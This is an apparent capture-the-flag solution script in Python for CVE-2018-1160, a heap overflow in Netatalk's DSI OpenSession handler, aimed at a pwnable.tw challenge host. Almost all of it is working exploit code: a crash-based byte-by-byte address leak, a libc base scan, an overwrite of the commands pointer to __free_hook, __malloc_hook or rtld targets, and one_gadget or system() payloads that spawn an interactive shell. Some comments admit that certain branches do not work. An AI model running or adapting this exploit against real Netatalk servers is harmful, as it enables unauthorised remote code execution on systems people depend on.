#!/usr/bin/env python3
"""
CVE-2018-1160 Netatalk Remote Code Execution Exploit
pwnable.tw challenge

Vulnerability: Out-of-bounds write in dsi_opensess.c
The DSI OpenSession handler (dsi_opensession) has no proper bounds checking
when parsing client options. An oversized DSIOPT_ATTNQUANT option causes
a heap buffer overflow that overwrites critical DSI struct fields.

Struct layout (from attn_quantum at offset 0x6d8 in DSI struct):
+0x00: attn_quantum (4 bytes)
+0x04: datasize (4 bytes)
+0x08: server_quantum (4 bytes) - reflected back to client!
+0x0c: unknown (4 bytes)
+0x10: commands (8 bytes) - pointer to DSI receive buffer (CRITICAL!)

Exploitation Strategy:
1. Use byte-by-byte oracle to leak heap/libc address (fork server preserves layout)
   - Overwrite commands ptr byte-by-byte
   - If address is readable, server responds; if not, crash (no response)
2. Calculate libc base from leaked address
3. Overwrite 'commands' ptr to __free_hook - 16
4. Send DSI command with one_gadget address (lands at __free_hook)
5. Trigger free() via dsi_close -> RCE

References:
- https://netatalk.io/security/CVE-2018-1160
- https://github.com/tenable/poc/tree/master/netatalk/cve_2018_1160
- https://shxdow.me/cve-2018-1160/
"""

import socket
import struct
import sys
import time

from pwn import *

context.arch = "amd64"
context.log_level = "info"

# ============================================================================
# Protocol Constants
# ============================================================================

DSI_CLOSESESSION = 0x01
DSI_COMMAND = 0x02
DSI_GETSTATUS = 0x03
DSI_OPENSESSION = 0x04
DSIOPT_ATTNQUANT = 0x01

# ============================================================================
# Libc Offsets (libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so)
# ============================================================================

LIBC_FREE_HOOK = 0x3ED8E8
LIBC_MALLOC_HOOK = 0x3EBC30
LIBC_SYSTEM = 0x4F440
LIBC_BINSH = 0x1B3E9A

# One gadgets from: one_gadget libc.so
ONE_GADGETS = [
    0x4F2C5,   # execve("/bin/sh", rsp+0x40, environ)
    0x4F322,   # execve("/bin/sh", rsp+0x40, environ)
    0x10A38C,  # execve("/bin/sh", rsp+0x70, environ)
]

# Alternative: _rtld_global._dl_rtld_lock_recursive (from shxdow exploit)
# rtld address is calculated from libc_base with known offset
# _dl_load_lock within rtld is at offset 0x908
# When exit() is called, system(_dl_load_lock) is invoked if we overwrite the function ptr
#
# shxdow exploit offsets (pwnable.tw specific):
RTLD_OFFSET = 0x61b060           # rtld offset from libc base (primary)
RTLD_OFFSET_ALT = 0xed4060       # rtld offset (fallback)
DL_LOAD_LOCK_OFF = 0x908         # _dl_load_lock offset within rtld structure
SYSTEM_OFFSET_IN_PAYLOAD = 0x5f8 # Where system() address is placed in payload


# ============================================================================
# Oracle Functions
# ============================================================================

def test_address_bytes(host, port, byte_list, timeout=2):
    """
    Test if overwriting commands pointer with given bytes results in valid read.
    Returns True if server responds (address is readable), False if crash.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))

        # Build overflow payload
        # Bytes 0-15: safe values for attn_quantum, datasize, server_quantum, unknown
        prefix = struct.pack("<I", 0x00040000)   # attn_quantum
        prefix += struct.pack("<I", 0x00100000)  # datasize
        prefix += struct.pack("<I", 0xCAFE0000)  # server_quantum
        prefix += struct.pack("<I", 0x00010001)  # unknown field

        # Append test bytes for commands pointer (offset 16+)
        payload = prefix + bytes(byte_list)

        # Build DSI OpenSession with oversized ATTNQUANT option
        option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
        hdr = struct.pack(">BBHIII", 0x00, DSI_OPENSESSION, 1, 0, len(option), 0)

        sock.sendall(hdr + option)
        sock.settimeout(timeout)
        resp = sock.recv(64)
        sock.close()

        return resp and len(resp) >= 16
    except Exception:
        return False
    finally:
        try:
            sock.close()
        except Exception:
            pass


def leak_address_byte_by_byte(host, port):
    """
    Leak the commands buffer address using byte-by-byte oracle.
    Fork server preserves memory layout across connections.
    Returns 6-byte address (48-bit virtual address space).
    """
    log.info("Starting byte-by-byte address leak...")
    leaked_bytes = []

    for byte_pos in range(6):
        log.info(f"Brute-forcing byte {byte_pos}...")
        found = False

        # Start with 0x00 for first byte (common for aligned addresses)
        # Use 0x7f hint for high byte (libc region)
        if byte_pos == 5:
            search_order = [0x7F] + list(range(0x55, 0x58)) + list(range(256))
        else:
            search_order = list(range(256))

        for test_val in search_order:
            test_bytes = leaked_bytes + [test_val]

            if test_address_bytes(host, port, test_bytes):
                leaked_bytes.append(test_val)
                log.success(f"  Byte {byte_pos}: 0x{test_val:02x}")
                found = True
                break

            time.sleep(0.02)  # Rate limit

        if not found:
            log.error(f"Failed to find byte {byte_pos}")
            return None

    # Reconstruct address (little-endian)
    addr = 0
    for i, b in enumerate(leaked_bytes):
        addr |= b << (i * 8)

    log.success(f"Leaked address: {hex(addr)}")
    return addr


def find_libc_base(host, port, leaked_addr):
    """
    Find libc base by scanning for valid __free_hook address.
    """
    log.info("Searching for libc base...")

    # Search around the leaked address
    for offset in range(-0x300000, 0x300000, 0x1000):
        test_base = ((leaked_addr + offset) & ~0xFFF)  # Page align
        test_hook = test_base + LIBC_FREE_HOOK

        # Test if __free_hook address is readable
        addr_bytes = list(struct.pack("<Q", test_hook)[:6])
        if test_address_bytes(host, port, addr_bytes, timeout=1.5):
            log.success(f"Found libc base: {hex(test_base)}")
            return test_base

        if offset % 0x100000 == 0:
            log.info(f"  Progress: offset {hex(offset)}...")

        time.sleep(0.01)

    log.error("Could not find libc base")
    return None


# ============================================================================
# Exploitation
# ============================================================================

def exploit(host, port, libc_base, gadget_idx=0, use_malloc_hook=False):
    """
    Execute RCE exploit:
    1. Overflow commands to point to hook
    2. Send packet with one_gadget address (written to hook)
    3. Trigger hook via close/next operation
    """
    if use_malloc_hook:
        hook = libc_base + LIBC_MALLOC_HOOK
        hook_name = "__malloc_hook"
    else:
        hook = libc_base + LIBC_FREE_HOOK
        hook_name = "__free_hook"

    one_gadget = libc_base + ONE_GADGETS[gadget_idx]

    log.info(f"libc_base:   {hex(libc_base)}")
    log.info(f"{hook_name}: {hex(hook)}")
    log.info(f"one_gadget:  {hex(one_gadget)}")

    # Target: write to hook
    # DSI header is read into fixed dsi->header buffer
    # DSI payload is read directly into dsi->commands
    target = hook

    try:
        r = remote(host, port, timeout=10)

        # Step 1: Overflow commands pointer
        log.info(f"Step 1: Overflow commands ptr to {hex(target)}")

        prefix = p32(0x00040000)   # attn_quantum
        prefix += p32(0x00100000)  # datasize
        prefix += p32(0xCAFE0000)  # server_quantum
        prefix += p32(0x00010001)  # unknown

        addr_bytes = p64(target)[:6]  # 6-byte address
        payload = prefix + addr_bytes

        option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
        hdr = struct.pack(">BBHIII", 0x00, DSI_OPENSESSION, 1, 0, len(option), 0)

        r.send(hdr + option)

        # Wait for response
        try:
            resp = r.recv(timeout=2)
            if not resp:
                log.error("No response to overflow - crash?")
                r.close()
                return False
            log.success("Overflow successful!")
        except Exception:
            log.error("Timeout waiting for overflow response")
            r.close()
            return False

        # Step 2+3: Write one_gadget to hook AND trigger in one packet
        # Since commands now points to hook, any packet data goes there
        # We send DSI_CLOSESESSION with our gadget - it writes, then triggers cleanup
        log.info(f"Step 2+3: Writing one_gadget to {hook_name} and triggering close")

        # For __free_hook: close triggers free() which invokes our gadget
        # For __malloc_hook: we need malloc to be called after write
        if use_malloc_hook:
            # Write gadget via DSI_COMMAND, then send another command to trigger malloc
            log.info("Writing gadget via DSI_COMMAND...")
            cmd_payload = p64(one_gadget)
            cmd_hdr = struct.pack(">BBHIII", 0x00, DSI_COMMAND, 2, 0, len(cmd_payload), 0)
            r.send(cmd_hdr + cmd_payload)

            try:
                resp2 = r.recv(timeout=2)
            except Exception:
                pass

            # Now __malloc_hook = one_gadget (WRONG! We just overwrote it with AFP error response!)
            # This approach won't work for malloc_hook with DSI_COMMAND
            log.info("Triggering malloc via another command...")
            trigger_hdr = struct.pack(">BBHIII", 0x00, DSI_GETSTATUS, 3, 0, 0, 0)
            r.send(trigger_hdr)
        else:
            # For free_hook: write gadget AND trigger close in one packet
            close_payload = p64(one_gadget)
            close_hdr = struct.pack(">BBHIII", 0x00, DSI_CLOSESESSION, 2, 0, len(close_payload), 0)
            r.send(close_hdr + close_payload)

        time.sleep(0.5)

        # Test for shell
        # The shell might not have stdin/stdout connected to our socket
        # The socket fd is probably 4 or 5 (after stdin/out/err + server fd)
        log.info("Testing for shell (trying different fds)...")

        for fd in [3, 4, 5, 6]:
            try:
                # Try to read from shell via different fd approaches
                # Redirect output to socket fd
                r.sendline(f"exec >&{fd} 2>&1".encode())
                time.sleep(0.1)
                r.sendline(b"id")
                time.sleep(0.1)
                response = r.recv(timeout=1)
                if b"uid" in response:
                    log.success(f"Got shell on fd {fd}!")
                    r.interactive()
                    return True
            except Exception:
                pass

        # Also try without fd redirection
        log.info("Trying direct commands...")
        try:
            r.sendline(b"id")
            response = r.recv(timeout=2)
            if b"uid" in response:
                log.success("Got shell!")
                r.interactive()
                return True
            log.info(f"Response: {response[:100]}")
        except Exception:
            pass

        # Try anyway
        log.info("Attempting interactive mode...")
        try:
            r.interactive()
        except Exception as e:
            log.warning(f"Interactive failed: {e}")

        r.close()
        return False

    except Exception as e:
        log.error(f"Exploit error: {e}")
        return False


def exploit_rtld(host, port, libc_base, use_alt_offset=False):
    """
    Alternative exploit using shxdow technique targeting rtld structure.

    From shxdow exploit:
    - rtld address = libc_base + 0x61b060 (or 0xed4060 fallback)
    - _dl_load_lock is at offset 0x908 within rtld
    - Payload: shell command padded to 0x5f8 bytes + system() address
    - The shell command ends up at _dl_load_lock
    - system() ends up at _dl_rtld_lock_recursive
    - When exit() triggers, system(shell_cmd) is called
    """
    rtld_off = RTLD_OFFSET_ALT if use_alt_offset else RTLD_OFFSET
    rtld_addr = libc_base + rtld_off
    target = rtld_addr + DL_LOAD_LOCK_OFF
    system_addr = libc_base + LIBC_SYSTEM

    log.info(f"libc_base: {hex(libc_base)}")
    log.info(f"rtld offset: {hex(rtld_off)}")
    log.info(f"rtld_addr: {hex(rtld_addr)}")
    log.info(f"target (_dl_load_lock): {hex(target)}")
    log.info(f"system(): {hex(system_addr)}")

    try:
        r = remote(host, port, timeout=10)

        # Step 1: Overflow commands to target address
        log.info(f"Step 1: Overflow commands to {hex(target)}")

        prefix = p32(0x00040000)
        prefix += p32(0x00100000)
        prefix += p32(0xCAFE0000)
        prefix += p32(0x00010001)

        addr_bytes = p64(target)[:6]
        payload = prefix + addr_bytes

        option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
        hdr = struct.pack(">BBHIII", 0x00, DSI_OPENSESSION, 1, 0, len(option), 0)

        r.send(hdr + option)

        try:
            resp = r.recv(timeout=2)
            if not resp:
                log.error("No response - crash?")
                r.close()
                return False
            log.success("Overflow successful!")
        except Exception:
            r.close()
            return False

        # Step 2: Write payload (reverse shell command + system address)
        # Following shxdow: shell command padded to 0x5f8, then system() at end
        log.info("Step 2: Writing payload (shell cmd + system)")

        # Use a simple shell command for testing
        shell_cmd = b"sh\x00"  # Or could use reverse shell
        # Pad to SYSTEM_OFFSET_IN_PAYLOAD (0x5f8), then append system()
        shell_payload = shell_cmd.ljust(SYSTEM_OFFSET_IN_PAYLOAD, b"\x00") + p64(system_addr)

        log.info(f"Payload length: {len(shell_payload)}")

        # Send via DSI_CLOSESESSION to write and trigger in one packet
        close_hdr = struct.pack(">BBHIII", 0x00, DSI_CLOSESESSION, 2, 0, len(shell_payload), 0)
        r.send(close_hdr + shell_payload)

        time.sleep(0.5)

        # Test for shell
        log.info("Testing for shell...")
        try:
            r.sendline(b"id")
            response = r.recv(timeout=2)
            if b"uid" in response:
                log.success("Got shell!")
                r.interactive()
                return True
            log.info(f"Response: {response[:50]}")
        except Exception:
            pass

        # Try anyway
        log.info("Attempting interactive mode...")
        try:
            r.interactive()
        except Exception as e:
            log.warning(f"Interactive failed: {e}")

        r.close()
        return False

    except Exception as e:
        log.error(f"Exploit error: {e}")
        return False


def exploit_system(host, port, libc_base):
    """
    FIXED: After overflow, every subsequent packet's DATA goes to __free_hook.
    So we can only write ONE thing, then must trigger immediately.

    Strategy:
    1. Overflow commands to __free_hook
    2. Send close packet with data length 0 (no data written to __free_hook)
       - This doesn't work because we need to write something first

    Alternative: Use DSI_TICKLE which expects no payload processing
    """
    hook = libc_base + LIBC_FREE_HOOK
    system_addr = libc_base + LIBC_SYSTEM
    binsh_addr = libc_base + LIBC_BINSH

    log.info(f"libc_base:   {hex(libc_base)}")
    log.info(f"__free_hook: {hex(hook)}")
    log.info(f"system:      {hex(system_addr)}")

    try:
        r = remote(host, port, timeout=10)

        # Overflow commands to __free_hook
        log.info(f"Overflow commands to {hex(hook)}")

        prefix = p32(0x00040000)
        prefix += p32(0x00100000)
        prefix += p32(0xCAFE0000)
        prefix += p32(0x00010001)

        addr_bytes = p64(hook)[:6]
        payload = prefix + addr_bytes

        option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
        hdr = struct.pack(">BBHIII", 0x00, DSI_OPENSESSION, 1, 0, len(option), 0)

        r.send(hdr + option)

        try:
            resp = r.recv(timeout=2)
            if not resp:
                r.close()
                return False
            log.success("Overflow successful!")
        except Exception:
            r.close()
            return False

        # Now commands = __free_hook
        # ANY packet with data will write that data to __free_hook
        # We need ONE write + trigger

        # Write one_gadget to __free_hook using DSI_CLOSESESSION with data
        # DSI_CLOSESESSION triggers cleanup which calls free()
        log.info("Writing one_gadget and triggering close in one packet")

        # Use the best one_gadget
        one_gadget = libc_base + ONE_GADGETS[0]  # 0x4f2c5
        log.info(f"Using one_gadget: {hex(one_gadget)}")

        # Send DSI_CLOSESESSION with our gadget as data
        # The data gets written to __free_hook, then close triggers free()
        close_payload = p64(one_gadget)
        close_hdr = struct.pack(">BBHIII", 0x00, DSI_CLOSESESSION, 2, 0, len(close_payload), 0)
        r.send(close_hdr + close_payload)

        time.sleep(0.5)

        # Test for shell
        log.info("Testing for shell...")
        try:
            r.sendline(b"id")
            response = r.recv(timeout=2)
            log.info(f"Response: {response}")
            if b"uid" in response:
                log.success("Got shell!")
                r.interactive()
                return True
        except Exception:
            pass

        r.interactive()
        r.close()
        return False

    except Exception as e:
        log.error(f"Exploit error: {e}")
        return False


def main():
    host = "chall.pwnable.tw"
    port = 10002

    if len(sys.argv) >= 2:
        if sys.argv[1] == "local":
            host = "localhost"
            port = 5566
        elif sys.argv[1] == "rtld":
            # Quick test of rtld approach with known libc base
            log.info("Quick rtld test mode")
            leaked = leak_address_byte_by_byte(host, port)
            if not leaked:
                return
            libc_base = find_libc_base(host, port, leaked)
            if not libc_base:
                return
            exploit_rtld(host, port, libc_base, use_alt_offset=False)
            time.sleep(0.5)
            exploit_rtld(host, port, libc_base, use_alt_offset=True)
            return
        elif sys.argv[1].startswith("0x"):
            # Direct exploit with provided libc base
            libc_base = int(sys.argv[1], 16)
            log.info(f"Using provided libc base: {hex(libc_base)}")
            # Try rtld first
            if exploit_rtld(host, port, libc_base, use_alt_offset=False):
                return
            if exploit_rtld(host, port, libc_base, use_alt_offset=True):
                return
            for i in range(len(ONE_GADGETS)):
                log.info(f"Trying one_gadget {i}")
                if exploit(host, port, libc_base, i):
                    return
                time.sleep(0.5)
            return

    log.info(f"Target: {host}:{port}")
    log.info("CVE-2018-1160 Netatalk RCE Exploit")
    log.info("=" * 50)

    # Step 1: Leak address via byte-by-byte oracle
    leaked = leak_address_byte_by_byte(host, port)
    if not leaked:
        log.error("Failed to leak address")
        return

    # Step 2: Find libc base
    libc_base = find_libc_base(host, port, leaked)
    if not libc_base:
        log.error("Failed to find libc base")
        return

    # Step 3: Exploit
    log.info("=== Exploitation Phase ===")

    # Try __free_hook with system()
    log.info("Trying system() approach...")
    if exploit_system(host, port, libc_base):
        log.success("System exploit successful!")
        return

    # Try __free_hook with one_gadgets
    log.info("Trying __free_hook with one_gadgets...")
    for i in range(len(ONE_GADGETS)):
        log.info(f"Trying one_gadget {i}: offset {hex(ONE_GADGETS[i])}")
        if exploit(host, port, libc_base, i, use_malloc_hook=False):
            log.success("Exploit successful!")
            return
        time.sleep(0.5)

    # Try __malloc_hook
    log.info("Trying __malloc_hook approach...")
    for i in range(len(ONE_GADGETS)):
        log.info(f"Trying one_gadget {i} with malloc_hook")
        if exploit(host, port, libc_base, i, use_malloc_hook=True):
            log.success("Exploit successful!")
            return
        time.sleep(0.5)

    log.warning("All hook approaches failed, trying rtld approach...")

    # Try primary rtld offset
    log.info(f"Trying rtld with primary offset 0x{RTLD_OFFSET:x}")
    if exploit_rtld(host, port, libc_base, use_alt_offset=False):
        log.success("RTLD exploit successful!")
        return

    time.sleep(1)

    # Try alternative rtld offset
    log.info(f"Trying rtld with alt offset 0x{RTLD_OFFSET_ALT:x}")
    if exploit_rtld(host, port, libc_base, use_alt_offset=True):
        log.success("RTLD exploit successful!")
        return

    log.error("All exploits failed")


if __name__ == "__main__":
    main()
